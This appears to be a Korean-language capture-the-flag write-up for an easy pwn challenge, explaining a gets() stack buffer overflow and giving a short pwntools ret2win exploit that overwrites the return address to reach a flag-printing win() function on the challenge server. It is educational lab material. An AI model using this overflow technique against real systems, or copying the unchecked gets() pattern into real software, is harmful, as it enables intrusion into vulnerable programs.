---
ctf_name: "DawgCTF 2026"
challenge_name: "Stacking Flags"
category: "pwn"
difficulty: "easy"
author: "sihyunkimm"
date: "2026-04-10"
points: 100
tags: [stack, bof]
---

# Stacking Flags

## 문제 설명

> 주어진 바이너리를 분석하여 flag를 출력하라.

- 원격 서버: `nc nc.umbccd.net 8921`
- 제공 파일: 취약한 C 코드 (stack overflow 발생)

## 풀이

### 분석

주어진 C 코드:

```c
void vulnerable_function() {
	char buffer[64];
	gets(buffer);
}
```

`gets()`는 길이 체크를 하지 않으므로, `buffer[64]`를 넘겨 입력하면 오버플로우 발생

코드 안에는 flag를 출력하는 `win()` 함수가 존재함

```c
void win() {
	...
	fgets(flag, sizeof(flag), fp);
	puts(flag);
}
```

`main()`에서 `win()` 주소를 제공

```test
win() is at: 0x4011a6
```

컴파일 옵션에 `-no-pie`가 포함되어 있어 주소는 고정

### 취약점

- Stack Buffer Overflow
- `gets()` 사용으로 인해 입력 길이 제한 없음

스택 레이아웃:

```text
[ buffer (64 bytes) ]
[ saved rbp (8 bytes) ]
[ return address (8 bytes) ]
```

리턴 주소까지의 offset은

```text
64 + 8 = 72 bytes
```

### 익스플로잇

리턴 주소를 `win()` 함수 주소로 덮어 ret2win 공격을 수행
익스플로잇 코드:

```python
from pwn import *

p = remote("nc.umbccd.net", 8921)

win_addr = 0x4011a6
payload = b"A" * 72 + p64(win_addr)

p.sendline(payload)
p.interactive()
```

## 플래그

```
flag{REDACTED}
```

## 배운 점

- 스택 구조를 이해하면 리턴 주소를 덮어 제어 흐름을 변경할 수 있다.
- 문제와 같은 형태의 약점을 ret2win 이라 한다.
- pwntools의 `p64()`를 사용하면 64비트 주소를 쉽게 payload로 변환할 수 있다.